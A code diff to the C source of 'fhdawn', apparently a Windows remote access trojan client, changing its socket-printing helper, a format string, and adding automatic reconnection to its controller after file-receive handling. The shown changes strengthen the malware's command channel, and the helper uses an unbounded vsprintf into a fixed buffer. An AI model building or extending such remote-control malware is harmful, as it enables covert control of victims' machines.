@@ -7,14 +7,16 @@ Modified: -
 
 #include "fhdawn.h"
 
-// By @augustgl
-int sockprintf(SOCKET sock, const char* words, ...) {
+// By @augustgl (github.com/augustgl)
+void sockprintf(SOCKET sock, const char* words, ...) {
     static char textBuffer[BUFFER];
+    memset(textBuffer, '\0', BUFFER);
     va_list args;
     va_start(args, words);
     vsprintf(textBuffer, words, args);
     va_end(args);
-    return send(sock, textBuffer, strlen(textBuffer), 0); // see, it's printf but for a socket. instead of printing, at the end it's a send()
+    sockSend(textBuffer);
+    // return send(sock, textBuffer, strlen(textBuffer), 0); // see, it's printf but for a socket. instead of printing, at the end it's a send()
 }
 
 void REConnect(void)
@@ -103,7 +105,7 @@ void fhdawn_main(void)
                 {
                     sockprintf(sockfd,"[Error Writing file %s of %s size] Error : %ld.", fileinfo[0], fileinfo[1], GetLastError());
                 } else {
-                    sockprintf(sockfd,"\n[ Received File : %s ]\n[ File Size : %s bytes ]\n[ Bytes written : %lu ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
+                    sockprintf(sockfd,"\n[ Received File : %s ]\n[ File Size : %s bytes ]\n[ Bytes written : %ld ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
                 }
                 CloseHandle(recvfile);
             }
@@ -115,6 +117,11 @@ void fhdawn_main(void)
         }
         
     }    
+
+    if(!connected)
+    {
+        REConnect();
+    }
 }
 
 void StartWSA(void)
